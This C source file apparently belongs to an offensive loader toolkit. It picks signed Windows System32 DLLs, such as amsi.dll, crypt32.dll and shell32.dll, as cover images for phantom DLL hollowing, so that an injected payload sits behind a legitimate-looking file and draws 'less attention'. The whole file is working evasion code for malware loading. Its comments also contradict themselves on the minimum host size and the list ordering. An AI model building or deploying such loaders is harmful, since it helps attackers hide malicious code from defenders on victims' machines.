/*
 * src/mapping/map_phantom_host_picker.c
 *
 * Curated list of System32 DLLs that satisfy the phantom-hollowing host
 * criteria:
 *  - Microsoft-signed
 *  - Larger than the typical loader payload (>= 256 KiB)
 *  - Not pulled into every process by default (so the section we
 *  create doesn't conflict with an already-loaded copy)
 *  - Mappable as SEC_IMAGE without requiring a load notification
 *
 * The resolver walks the list from index 0, builds a full path
 * (`%WINDIR%\System32\<name>`), stats it, and returns the first
 * candidate whose on-disk size is >= payload_size. The caller is
 * responsible for actually mapping it via NtCreateSection - we don't
 * open a handle here.
 */

#include "mapping/map_phantom_host_picker.h"
#include "core/wr_ptr_check.h"

#include <windows.h>
#include <wchar.h>

/* Curated candidates ordered small → large. The picker walks the list
 * and returns the first DLL whose on-disk size >= payload. Smaller hosts
 * give the tightest cover (less wasted address space, less attention)
 * but only fit small payloads; the larger ones at the bottom catch
 * Rust cdylibs / heavy C++ runtimes that easily reach 5-15 MiB.
 *
 * Sizes are approximate - the picker validates each candidate at
 * runtime via GetFileSize. */
static const wchar_t *const kHostCandidates[] = {
  /* Small (<= 256 KiB) - fits typical C loader payloads. */
  L"xpsservices.dll",         /* ~200 KiB */
  L"xolehlp.dll",             /* ~20 KiB  */
  L"diagperf.dll",            /* ~200 KiB */
  L"amsi.dll",                /* ~80 KiB  */
  L"version.dll",             /* ~30 KiB  */

  /* Medium (256 KiB .. 2 MiB). */
  L"mshtmlmedia.dll",         /* ~600 KiB */
  L"shdocvw.dll",             /* ~200 KiB */
  L"WindowsCodecs.dll",       /* ~1.5 MiB */
  L"crypt32.dll",             /* ~1.4 MiB */
  L"mfcore.dll",              /* ~2 MiB   */
  L"twinapi.appcore.dll",     /* ~3 MiB   */

  /* Large (> 2 MiB) - last resort for Rust cdylibs / .NET-heavy
   * payloads. These DLLs are typically not pre-loaded in non-GUI
   * processes, so the SEC_IMAGE we create doesn't conflict with an
   * already-mapped copy. */
  L"D3DCompiler_47.dll",      /* ~4 MiB   */
  L"wininet.dll",             /* ~5 MiB   */
  L"d3d12.dll",               /* ~6 MiB   */
  L"shell32.dll",             /* ~7 MiB   */
  L"mshtml.dll",              /* ~25 MiB  */

  NULL,
};

static int build_system32_path(const wchar_t *name,
  wchar_t *out, size_t cap)
{
  UINT n = GetSystemDirectoryW(out, (UINT)cap);
  if (n == 0 || n >= cap) {
  return 0;
  }
  if (n > 0 && out[n - 1] != L'\\') {
  if (n + 1 >= cap) return 0;
  out[n++] = L'\\';
  }
  size_t name_len = wcslen(name);
  if (n + name_len + 1 >= cap) {
  return 0;
  }
  wcscpy(out + n, name);
  return 1;
}

static int file_size_ge(const wchar_t *path, size_t needed)
{
  HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (h == INVALID_HANDLE_VALUE) {
  return 0;
  }
  LARGE_INTEGER sz;
  BOOL ok = GetFileSizeEx(h, &sz);
  CloseHandle(h);
  if (!ok) {
  return 0;
  }
  return (uint64_t)sz.QuadPart >= (uint64_t)needed;
}

wraith_status_t wr_phantom_pick_host(size_t payload_size,
  const wchar_t *preferred,
  wchar_t *out_path, size_t cap)
{
  if (!out_path || cap == 0) {
  return WRAITH_E_NULL_ARG;
  }
  out_path[0] = 0;

  /* Try preferred first. Caller is allowed to pass a path or a bare
  * filename; we treat it as a filename when there's no separator. */
  if (preferred && preferred[0]) {
  wchar_t buf[MAX_PATH];
  const wchar_t *path = preferred;
  if (!wcschr(preferred, L'\\') && !wcschr(preferred, L'/')) {
  if (!build_system32_path(preferred, buf, sizeof(buf) /
  sizeof(buf[0]))) {
  return WRAITH_E_MAP_NO_HOST_DLL;
  }
  path = buf;
  }
  if (file_size_ge(path, payload_size)) {
  wcsncpy(out_path, path, cap - 1);
  out_path[cap - 1] = 0;
  return WRAITH_OK;
  }
  }

  for (int i = 0; kHostCandidates[i] != NULL; ++i) {
  wchar_t buf[MAX_PATH];
  if (!build_system32_path(kHostCandidates[i], buf,
  sizeof(buf) / sizeof(buf[0]))) {
  continue;
  }
  if (file_size_ge(buf, payload_size)) {
  wcsncpy(out_path, buf, cap - 1);
  out_path[cap - 1] = 0;
  return WRAITH_OK;
  }
  }
  return WRAITH_E_MAP_NO_HOST_DLL;
}
